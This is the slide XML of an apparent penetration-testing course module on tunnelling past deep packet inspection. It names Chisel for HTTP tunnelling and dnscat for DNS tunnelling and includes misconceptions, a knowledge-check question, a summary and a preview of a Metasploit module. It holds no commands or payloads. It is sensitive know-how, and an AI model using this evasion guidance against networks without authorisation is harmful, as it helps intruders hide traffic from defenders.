            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3390900" y="5243513"/>
            <a:ext cx="4686300" cy="485775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3390900" y="5719763"/>
            <a:ext cx="4686300" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="5348288"/>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Deep Packet Inspection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="5243513"/>
            <a:ext cx="9410700" cy="485775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="5719763"/>
            <a:ext cx="9410700" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="5348288"/>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problem this module's whole unit addresses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="6205538"/>
            <a:ext cx="2590800" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="952500" y="5834063"/>
            <a:ext cx="23637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Chisel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3390900" y="6205538"/>
            <a:ext cx="4686300" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="5834063"/>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An HTTP tunnelling tool</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="6205538"/>
            <a:ext cx="9410700" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="5834063"/>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18.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="6215063"/>
            <a:ext cx="2590800" cy="485775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="6691313"/>
            <a:ext cx="2590800" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="952500" y="6319838"/>
            <a:ext cx="23637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dnscat</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3390900" y="6215063"/>
            <a:ext cx="4686300" cy="485775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3390900" y="6691313"/>
            <a:ext cx="4686300" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="6319838"/>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DNS tunnelling tool</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="6215063"/>
            <a:ext cx="9410700" cy="485775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8077200" y="6691313"/>
            <a:ext cx="9410700" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A2F3A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="6319838"/>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18.1</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995613"/>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COMMON MISCONCEPTIONS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="349091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What learners get wrong about Module 18</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4157663"/>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4395788"/>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“DNS TUNNELLING IS ALWAYS THE BETTER, STEALTHIER CHOICE”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="4714875"/>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is significantly slower. HTTP tunnelling is the first choice whenever it remains viable.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9248775" y="4157663"/>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4395788"/>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“THIS MODULE SOLVES THE SAME PROBLEM AS MODULE 17”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9486900" y="4714875"/>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17 solves reachability; this module solves inspection specifically — a distinct problem requiring a distinct answer.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5829300"/>
            <a:ext cx="8239125"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038225" y="6067425"/>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“WRAPPING TRAFFIC IN HTTP GUARANTEES IT PASSES INSPECTION”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="6386513"/>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Sophisticated inspection can still notice HTTP traffic that does not resemble genuine browsing behaviour.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9248775" y="5829300"/>
            <a:ext cx="8239125" cy="1462088"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10423"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="2000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A2F3A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9486900" y="6067425"/>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“THIS IS A MINOR MODULE BECAUSE IT'S SHORT”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9486900" y="6386513"/>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is the deepest fallback available when every other tunnelling approach in the course has failed.</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464084" y="3273326"/>
            <a:ext cx="3359758"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MODULE 18 IN CONTEXT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8646468" y="3749576"/>
            <a:ext cx="995065" cy="1562100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="86957"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="12000" b="1" spc="-300" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF6A00"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475837" y="5502176"/>
            <a:ext cx="17336252" cy="520005"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="96381"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5F7FB"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>named tools, one Learning Unit — the most compact module in the syllabus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3257550" y="6212681"/>
            <a:ext cx="11772900" cy="839093"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125522"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2175" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8C0CF"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Chisel for HTTP tunnelling, dnscat for DNS tunnelling. Percentage weightings per module: information not defined in the official exam outline.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="21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48602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KNOWLEDGE CHECK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="2981325"/>
            <a:ext cx="17188434" cy="8763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HTTP tunnelling with Chisel has been detected and blocked, but DNS resolution still functions normally. What is the next viable option from this module?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="4143375"/>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324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333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A</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1952625" y="4398169"/>
            <a:ext cx="4309772"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SSH remote dynamic port forwarding</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5095875"/>
            <a:ext cx="16687800" cy="800100"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6A00">
              <a:alpha val="10000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="B85100"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225" y="5276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286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B</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1952625" y="5350669"/>
            <a:ext cx="3168953"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DNS tunnelling with dnscat</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="6048375"/>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229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238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C</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1952625" y="6303169"/>
            <a:ext cx="2547833"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Netsh port forwarding</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="7000875"/>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7181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7191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D</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1952625" y="7255669"/>
            <a:ext cx="1659456"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Socat relaying</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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8352"/>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SUMMARY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="433365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Module 18 in one line</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="5000402"/>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518137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519090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18.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1952625" y="5255196"/>
            <a:ext cx="1521897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When traffic is inspected and blocked, wrap it in HTTP with Chisel first, and fall back to DNS with dnscat when even HTTP is filtered</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="6048152"/>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Module 17 solved reachability. This module solves inspection. Together they form the course's complete tunnelling toolkit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="21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NEXT STEPS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="1143000"/>
            <a:ext cx="18356580" cy="738188"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="25400" tIns="25400" rIns="25400" bIns="25400" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="90741"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5250" b="1" spc="-37" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5F7FB"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Module 19: The Metasploit Framework</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="2128838"/>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COMING NEXT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038225"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Getting familiar with Metasploit, using its payloads, performing post-exploitation, and automating with resource scripts.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6426175" y="2128838"/>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BEFORE THEN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6664300"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Be able to state which tunnelling approach you would try first, and why, when facing an inspected network.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="12052250" y="2128838"/>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2366963"/>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CARRY FORWARD</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="12290375" y="2686050"/>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manual-first discipline running through Modules 9, 12, 13 and 17. Module 19 is where the course finally introduces a full framework.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1875" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="9210675"/>
            <a:ext cx="16687800" cy="9525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
